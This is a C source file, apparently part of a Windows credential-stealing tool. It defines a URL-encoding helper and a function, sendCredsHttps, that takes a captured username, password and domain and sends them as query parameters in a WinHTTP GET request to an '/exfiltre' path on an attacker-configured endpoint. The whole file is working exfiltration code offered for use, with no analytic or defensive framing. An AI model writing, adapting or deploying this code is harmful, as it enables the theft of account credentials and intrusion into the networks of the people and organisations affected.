#include "pch.h"
#include "utils.h"
#include "https.h"

static wchar_t* urlEncode(const wchar_t* str)
{
    size_t len = wcslen(str);
    size_t new_len = 0;
    const wchar_t* p = str;
    wchar_t c;
    wchar_t* new_str;
    wchar_t* q;

    // Calculate the length of the encoded string.
    while (*p)
    {
        c = *p++;
        if (c == L' ')
        {
            new_len += 3;
        }
        else if (iswalnum(c) || c == L'-' || c == L'_' || c == L'.' || c == L'~')
        {
            new_len += 1;
        }
        else
        {
            new_len += 3;
        }
    }

    // Allocate memory for the encoded string.
    new_str = (wchar_t*)LocalAlloc(LPTR, (new_len + 1) * sizeof(wchar_t));
    if (!new_str)
    {
        return NULL;
    }

    // Encode the string.
    q = new_str;
    p = str;
    while (*p)
    {
        c = *p++;
        if (c == L' ')
        {
            *q++ = L'%';
            *q++ = L'2';
            *q++ = L'0';
        }
        else if (iswalnum(c) || c == L'-' || c == L'_' || c == L'.' || c == L'~')
        {
            *q++ = c;
        }
        else
        {
            swprintf(q, 4, L"%%%02X", (unsigned char)c);
            q += 3;
        }
    }

    // Terminate the encoded string.
    *q = L'\0';

    return new_str;
}

BOOL sendCredsHttps(LPWSTR username, LPWSTR password, LPWSTR domain) {

    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    BOOL bResults = FALSE;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer = NULL;
    DWORD dw = 0;

    // Initialize WinHTTP.
    if (!(hSession = WinHttpOpen(USERAGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0)))
        return FALSE;

    // Connect to the server.
    if (!(hConnect = WinHttpConnect(hSession, HTTPS_ENDPOINT, INTERNET_DEFAULT_HTTP_PORT, 0)))
        return FALSE;

    WCHAR request[BUFFER_SIZE] = { 0 };
    WCHAR* encodedUsername = NULL;
    WCHAR* encodedPassword = NULL;
    WCHAR* encodedDomain = NULL;

    encodedUsername = urlEncode(username);
    encodedPassword = urlEncode(password);
    encodedDomain = urlEncode(domain);

    ////printf("password(%lu): %ls\n", encodedUsername, dw);

    wcscat_s(request, BUFFER_SIZE, L"/exfiltre?username=");

    wcscat_s(request, BUFFER_SIZE, encodedUsername);
    wcscat_s(request, BUFFER_SIZE, L"&password=");
    wcscat_s(request, BUFFER_SIZE, encodedPassword);
    wcscat_s(request, BUFFER_SIZE, L"&domain=");
    wcscat_s(request, BUFFER_SIZE, encodedDomain);



    // Create the request.
    if (!(hRequest = WinHttpOpenRequest(hConnect, L"GET", request, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0)))
        return FALSE;

    // Send the request.
    if (!(bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)))
        return FALSE;



    // Clean up.
    LocalFree(encodedDomain);
    LocalFree(encodedPassword);
    LocalFree(encodedUsername);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return TRUE;
}